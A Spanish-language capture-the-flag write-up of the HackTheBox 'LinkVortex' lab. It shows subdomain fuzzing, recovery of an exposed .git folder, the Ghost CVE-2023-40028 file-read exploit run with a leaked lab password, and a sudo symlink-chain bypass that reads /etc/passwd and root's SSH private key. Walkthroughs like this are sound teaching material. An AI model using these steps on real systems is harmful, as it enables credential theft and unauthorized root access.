---
layout       : post
title        : "HackTheBox - LinkVortex"
author       : lanz
footer_image : assets/images/footer-card/linux-icon.png
footer_text  : Linux
image        : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-banner.png
category     : [ htb ]
tags         : [ symlinks, ghost, sudo, path-traversal, .git-folder-leak, code-analysis ]
---
Entorno Linux nivel fácil. Lidiaremos con `ghost`, un `.git/` filtrado, credenciales volando, encadenaremos links (?) y leeremos archivos del sistema.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-lab-information.png" style="width: 100%;"/>

**💥 Laboratorio creado por**: [0xyassine](https://app.hackthebox.com/profile/143843).

## TL;DR (Spanish writeup)

Hay que revisar antes de dar click a cualquier link ⛓️

El servicio web está ejecutando el software `ghost` en su dominio, inicialmente encontraremos al usuario `admin` y aprovechando mensajes de error sabremos que es válido. Realizando fuzzing llegaremos a un subdominio, este está alojando una carpeta `.git/`, la descargaremos y en su contenido llegaremos a una contraseña, juntándola al usuario `admin` tendremos credenciales funcionales en el login de `ghost`.

Existe una vulnerabilidad que afecta la versión de `ghost 5.58` y que permite leer archivos del sistema (path traversal). Con ayuda de un archivo de la carpeta `.git/` leeremos un objeto de configuración el cual tiene otras credenciales, usándolas con el servicio `SSH` obtendremos una sesión en el sistema como el usuario `bob`.

Este usuario tiene permisos para ejecutar como cualquier otro usuario el script `/opt/ghost/clean_symlink.sh`. Este hace uso de links simbólicos para leer archivos del sistema, peeero no todos los archivos son permitidos (ni objetos de `/etc/` ni de `/root/`). Haciendo revisión de código, encontramos una falla que al concatenar varios links simbólicos logramos saltar la validación y con esto, leer todos los archivos del sistema. Leeremos la llave privada `SSH` del usuario `root` y obtendremos una sesión como él.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-statistics.png" style="width: 80%;"/>

Enumeración (así que a tomar buenas notas) y enfocada en cositas reales.

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

Thong 😎

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeracion)
  * [Jugando con el sitio web](#enumeracion-puerto-80)
  * [¿Una carpeta **.git/** por ahí volando?](#enumeracion-puerto-80-git)
3. [Explotación](#explotacion)
4. [Escalada de privilegios](#escalada-de-privilegios)
  * [Evitando que nos enlacen](#escalada-bypass-link-simbolico)
6. [Post-Explotación](#post-explotacion)

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

Vamos a empezar como siempre, pidiéndole ayuda a `nmap` para que nos dé una mano encontrando que puertos (servicios) están activos en este entorno:

```bash
nmap -p- --open -v 10.10.11.47 -oA tcp-all-htb-linkvortex
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535 puertos |
| --open    | Devuelve solo los puertos que estén abiertos |
| -v        | Permite ver en consola lo que va encontrando |
| -oA       | Guarda el output en diferentes formatos, entre ellos uno "grepeable". Lo usaremos junto a la función [extractPorts](https://pastebin.com/raw/X6b56TQ8) de [S4vitar](https://s4vitar.github.io/) para copiar los puertos en la clipboard rápidamente |

El escaneo nos permite encontrar:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Servicio que permite la obtención de una terminal de forma segura |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Servicio para interactuar con un servidor web |

> Usando la función `extractPorts` (referenciada antes) podemos tener rápidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuviéramos varios puertos evitamos tener que escribirlos uno a uno:
 
> `extractPorts tcp-all-htb-linkvortex.gnmap`

Ya con los puertos copiados, `nmap` nos puede seguir ayudando para intentar obtener la versión del software detrás de cada servicio y también para que el mismo ejecute algunos scripts internos a ver si encuentra algo más:

```bash
nmap -sCV -p 22,80 10.10.11.47 -oA tcp-port-htb-linkvortex
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Indicamos a qué puertos queremos realizar el escaneo |
| -sC       | Ejecuta scripts predefinidos contra cada servicio |
| -sV       | Intenta extraer la versión del servicio |

Obtenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) |
| 80     | HTTP     | Apache httpd |

Pero también, el servicio HTTP está haciendo una redirección a la URL `http://linkvortex.htb/`, ya veremos esto en detalle. Por ahora no tenemos más, así que a darle!

# Enumeración [#](#enumeracion) {#enumeracion}

---

## Jugando con el sitio web [📌](#enumeracion-puerto-80) {#enumeracion-puerto-80}

Como ya vimos, el servicio HTTP está haciendo una redirección a la URL `http://linkvortex.htb/`, el tema es que si nos dirigimos a esa URL, nuestro sistema se pierde, no sabe qué hacer y retorna error. Esto se soluciona usando el archivo [/etc/hosts](https://www.arsys.es/blog/modificar-hosts) para que al momento de acceder a una URL, esta relacione la dirección IP de donde debe sacar el contenido y sepa qué resolver.

```bash
➧ tail -n 1 /etc/hosts
10.10.11.47     linkvortex.htb
```

Ahora sí, exploremos el sitio web.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-page80.png" style="width: 100%;"/>

Entre la información que existe, notamos que los posts han sido creados por el usuario `admin`, podemos pensar que es `admin@linkvortex.htb`, así que guardémoslo por sí algo.

Si hacemos una petición hacia el archivo [robots.txt](https://es.wikipedia.org/wiki/Est%C3%A1ndar_de_exclusi%C3%B3n_de_robots) encontramos cositas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-page80-robotsTXT.png" style="width: 100%;"/>

Entre las rutas vemos `/ghost/`, que si la visitamos nos responde correctamente con un login:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-page80-ghost.png" style="width: 100%;"/>

> 👻 `Ghost` es una app que permite crear y compartir contenido web: [https://ghost.org/](https://ghost.org/)

Si probamos el posible usuario que encontramos (`admin@linkvortex.htb`), sabemos que existe, ya que el sitio web está manejando los mensajes de error de forma -errónea- :P

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-page80-ghost-signin-admin.png" style="width: 60%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-page80-ghost-signin-aadmin.png" style="width: 60%;"/>

Así que listones, tenemos un usuario (:

Buscando en internet vulns relacionadas con **ghost**, tenemos una para leer archivos del sistema ([**directory traversal**](https://lanzt.github.io/article/directory-traversal)), pero se necesitan credenciales...

Como no tenemos mucho más, me puse a buscar subdominios (aplicaciones que están siendo ejecutadas sobre una misma IP ([virtual hosting](https://slack.com/intl/es-es/blog/transformation/virtual-hosts-que-son-y-como-funcionan)), pero con otro dominio (recuerda lo aprendido del `/etc/hosts`)):

```bash
ffuf -c -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.linkvortex.htb' -u http://10.10.11.47
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ffuf-subdomains-dev.png" style="width: 100%;"/>

Y obtenemos uno: `dev.linkvortex.htb`, lo agregamos al `/etc/hosts`:

```bash
➧ tail -n 1 /etc/hosts
10.10.11.47     linkvortex.htb dev.linkvortex.htb
```

Yyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-page80dev.png" style="width: 100%;"/>

Un sitio en construcción!! 😋 Veamos si el sitio está alojando archivos que nos puedan llamar la atención:

```bash
ffuf -c -w /opt/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/FUZZ
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ffuf-dev-common.png" style="width: 100%;"/>

Y sí, lo que más llama la atención es la carpeta `.git/`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-page80dev-git.png" style="width: 100%;"/>

## ¿Una carpeta .git/? [📌](#enumeracion-puerto-80-git) {#enumeracion-puerto-80-git}

¿Y por qué esta carpeta llama la atención? Sencillo, un objeto `.git/` aloja todos los metadatos relacionados con un proyecto, estos pueden ser logs, cambios que sufrió el código del proyecto y los mensajes de los desarrolladores para dar a entender qué se hizo, referencias internas y otras cosas llamativas. Por lo que pueda que si llegamos a interactuar completamente con esa carpeta, logremos extraer TODO el código fuente del proyecto, ver mensajes hechos por los desarrolladores, en fin, información crucial para un control de versiones.

* [https://medium.com/stolabs/git-exposed-how-to-identify-and-exploit](https://medium.com/stolabs/git-exposed-how-to-identify-and-exploit-62df3c165c37)

Lo primero que debemos hacer es descargar todo el contenido de la carpeta, para eso podemos usar `wget`:

```bash
wget --mirror http://dev.linkvortex.htb/.git/
```

> `--mirror` le indica a **wget** que queremos hacer una descarga recursiva, o sea, TODITO

Ahora, nos metemos a esa carpeta descargada:

```bash
➧ ls    
 dev.linkvortex.htb
➧ cd dev.linkvortex.htb
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-cd-git.png" style="width: 100%;"/>

Si ejecutamos el comando `git status` vemos tooooodos los archivos borrados, modificados, nuevos, etc. En este caso la carpeta solo tiene referencias lógicas, no encuentra varios objetos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-cd-git-gitStatus.png" style="width: 100%;"/>

Pero como tiene esas referencias lógicas, podemos intentar recuperar los archivos borrados usando cualquiera de estos dos comandos:

```bash
git checkout -- . 
git restore .
```

Y si ahora verificamos el contenido de la carpeta donde ejecutamos el `git status`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-cd-git-lsLa.png" style="width: 100%;"/>

AJAIII! Tenemos todo el código del proyecto restaurado 🔥 👨‍🚒 🔥

Así que ahora, a revisar archivos con nombres llamativos, buscar palabras clave y a abrir bien los ojos pa que no se nos escape nada :P

Después de un rato al buscar en todos los archivos la palabra `password`, me encontré salsa:

```bash
➧ ls    
 apps   Dockerfile.ghost   ghost   icons   index.html   LICENSE   nx.json   package.json   PRIVACY.md   README.md   SECURITY.md   yarn.lock
➧ grep -rna "password" .
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-cd-git-grepPassword.png" style="width: 100%;"/>

Hay varias contraseñas quemadas en algunos archivos, pero una "más real" que las otras:

...

Juntando esa contraseña, el usuario `admin` y el login de **ghost**...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-page80-ghost-dashboard.png" style="width: 100%;"/>

TAMOS DENTROOOOOOOOOOOOOOOOOOOOOOOO 🎷

# Explotación [#](#explotacion) {#explotacion}

¿Y si tenemos credenciales funcionales, que puede significaaaaaaar? ⏲️ 

¡Que podemos probar la vulnerabilidad para leer archivos del sistema ([directory traversal](https://lanzt.github.io/article/directory-traversal))!

* [https://www.cve.org/CVERecord?id=CVE-2023-40028](https://www.cve.org/CVERecord?id=CVE-2023-40028)
* [Arbitrary File Read](https://security.snyk.io/vuln/SNYK-JS-GHOST-5843513)

La falla viene de la opción que tienen usuarios autenticados para subir archivos que son [links simbólicos](https://es.wikipedia.org/wiki/Enlace_simb%C3%B3lico), o sea, que pueden hacer referencia a otros archivos fuera de la estructura actual.

También nos encontramos un script que automatiza la explotación:

* [https://github.com/0xyassine/CVE-2023-40028](https://github.com/0xyassine/CVE-2023-40028) (al finalizar la resolución me di cuenta de que el creador es el mismo de esta máquina :P)

Así que, nos descargamos el script y lo ejecutamos tal que:

```bash
./0xyassine-ghost-5.58-arbitrary-file-read.sh -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45'
```

Y si por ejemplo intentamos llegar al objeto que tiene todos los usuarios del sistema ([/etc/passwd](https://www.linuxenespañol.com/ayuda/etc-passwd-descripcion-de-funcionamiento-y-formato/)):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-sh-pathTraversalGhost-etcPasswd.png" style="width: 100%;"/>

Lo podemos leer (:

Después de un buen rato leyendo archivos no relevantes, se me ocurrió volver a nuestro objeto `.git/` y validar si algo de ahí nos podía servir y si quizá debíamos leer un archivo de ahí, quizá con cambios en su contenido o algo así... Pues me sirvió :D

Si ejecutamos un `git status`, vemos dos archivos que tuvieron cambios que no han sido guardados, uno de ellos ya lo usamos antes:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-cd-git-gitStatus-modifiedFiles.png" style="width: 100%;"/>

Revisando el contenido del `Dockerfile.ghost`, encontramos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-cd-git-catDockerfileGhost.png" style="width: 100%;"/>

Hace referencia a un archivo de configuración que no tenemos en nuestra carpeta... ¿Qué hacemooooos? esaaaaato:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-sh-pathTraversalGhost-configProductionJson.png" style="width: 50%;"/>

AÑAÑAIIII, ahora sí!!! Se nos revelan unas credenciales, que al ser probadas contra el servicio `SSH` (`ssh bob@linkvortex.htb`):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ssh-bob.png" style="width: 100%;"/>

Veamos con que nos encontramos.

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Notamos que el usuario `bob` tiene el permiso de ejecutar como cualquier usuario un script pasándole solo archivos `.png`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ssh-bob-sudoL.png" style="width: 100%;"/>

Antes de meternos con el script, hay algo llamativo en la imagen:

```bash
env_keep+=CHECK_CONTENT
```

Buscando en la web, llegamos a [este](https://www.busindre.com/escalada_de_privilegios_con_variable_ld_preload) recurso, aprendemos que `env_keep` permite definir una variable y que el usuario que ejecute `sudo` puede hacer uso de esa variable al pasarla como parte del comando, algo tal que:

```bash
sudo CHECK_CONTENT="hola" /bin/bash /el/script/o/lo/que/sea
```

Con esto claro y anotado por si algo, vemos el contenido del script:

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

Si nos fijamos, al puro inicio hace uso de la variable y válida si trae contenido, si no, la setea en `false`. Al final la vuelve a usar y esta vez la válida como un booleano, o sea, está esperando que sea `true` para ejecutar el `echo` y el `cat`. Así que al momento de enviarla, ya sabemos que debe ir `true` y así tener el resultado esperado.

Le debemos pasar un archivo que su nombre termine en `.png`, después válida con `/usr/bin/test -L` que este exista y sea un link simbólico, prueba rápida:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ssh-bob-usrBinTest-withoutLink.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ssh-bob-usrBinTest-withLink.png" style="width: 100%;"/>

Lo siguiente es que extrae hacia donde redirige el link simbólico (`/usr/bin/readlink`) y hace una validación importante:

```bash
[...]
if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
[...]
```

Está revisando que el link no intente leer archivos importantes del sistema ni de la ruta root, así que esto es lo que vamos a intentar saltarnos...

Probemos a ver si es verdad, creemos un link simbólico hacia el archivo `/etc/passwd` usando el archivo `buenas.png`, o sea, si hacemos un `cat buenas.png`, es como estar haciendo `cat /etc/passwd`.

```bash
$ ln -s /etc/passwd /tmp/.sisisi/buenas.png
$ ls -la buenas.png 
lrwxrwxrwx 1 bob bob 11 Apr 11 01:28 buenas.png -> /etc/passwd
$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh buenas.png
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ssh-bob-sudo-fail.png" style="width: 100%;"/>

Y sí, está detectando que nuestro link contiene `etc` en su nombre y nos muestra el error.

## Evitando que nos enlacen [📌](#escalada-bypass-link-simbolico) {#escalada-bypass-link-simbolico}

Dándole algunas vueltas, al final dije "¿Y si creamos un link que apunte a otro link?" ay diosito...

Como ya vimos, la validación para saber si el link contiene `etc` o `root` solo la hace una vez, por lo que podríamos crear dos archivos, uno con el **link objetivo** y otro que actuaria como el **link conductor**. ¿Para qué? La idea sería pasarle al script el **link conductor** y este llamaría al **link objetivo**, como únicamente se va a validar el nombre del link al cual se dirige **link conductor** (que sería **link objetivo**, más no el link interno de **link objetivo**), pues ya habríamos logrado saltarnos ese filtro.

Mucho texto, se entiende mejor con la práctica:

Hagamos que nuestro **link objetivo** se llame `verdadero.png` y apunte a `/etc/passwd`:

```bash
ln -s /etc/passwd /tmp/.sisisi/verdadero.png
```

Y que nuestro **link conductor** se llame `falso.png` y apunte a `verdadero.png` (nuestro **link objetivo):

```bas
ln -s /tmp/.sisisi/verdadero.png /tmp/.sisisi/falso.png
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ssh-bob-lsLa-links.png" style="width: 100%;"/>

Entonces, si hacemos `cat falso.png`, siguiendo toda la cadena, llegaríamos a `/etc/passwd`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ssh-bob-cat-falsoLinksPasswd.png" style="width: 100%;"/>

```bash
$ /usr/bin/readlink falso.png 
/tmp/.sisisi/verdadero.png
```

Ejecutemos esta vainaaaaa:

```bash
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh falso.png
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ssh-bob-sudo-done-etcPasswd.png" style="width: 100%;"/>

EEEEeeeseklfjakljeiopq1jiop1iop4jjfsdaf, tamos!

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-google-gif-madness-complete.gif" style="width: 50%;"/>

...

Entre los archivos útiles que podemos buscar, está la llave privada (si es que existe) del usuario `root`, esto para conectarnos por `SSH` sin usar una contraseña.

* [How to ssh to remote server using a private key?](https://unix.stackexchange.com/questions/23291/how-to-ssh-to-remote-server-using-a-private-key)

Veamos:

```bash
ln -s /root/.ssh/id_rsa /tmp/.sisisi/verdadero.png
ln -s /tmp/.sisisi/verdadero.png /tmp/.sisisi/falso.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh falso.png
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ssh-bob-sudo-done-rootSshIdrsa.png" style="width: 100%;"/>

¡Existe! Así que tomemos ese contenido, creemos un archivo en nuestra máquina, peguemos el contenido y démosle los permisos necesarios para poder ejecutar `SSH`:

```bash
chmod 600 root.id_rsa
ssh root@linkvortex.htb -i root.id_rsa
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-bash-ssh-root.png" style="width: 100%;"/>

Y listoooones (: Hemos terminado la resolución de la máquina.

# Post-Explotación [#](#post-explotacion) {#post-explotacion}

---

## Flags [📌](#post-explotacion-flags) {#post-explotacion-flags}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/linkvortex/htb638-flags.png" style="width: 100%;"/>

...

Una linda máquina, toda enfocada en links.

La escalada la sentí muy CTF, pero aun así me gusto el concepto de bypassear un comando propio del sistema.

Y bueno, esto ha sido por ahora, como siempre muchas gracias por pasarse y leer un rato. ¡Nos chequeamos después y a seguir rompiendo de todooOOOOO!!!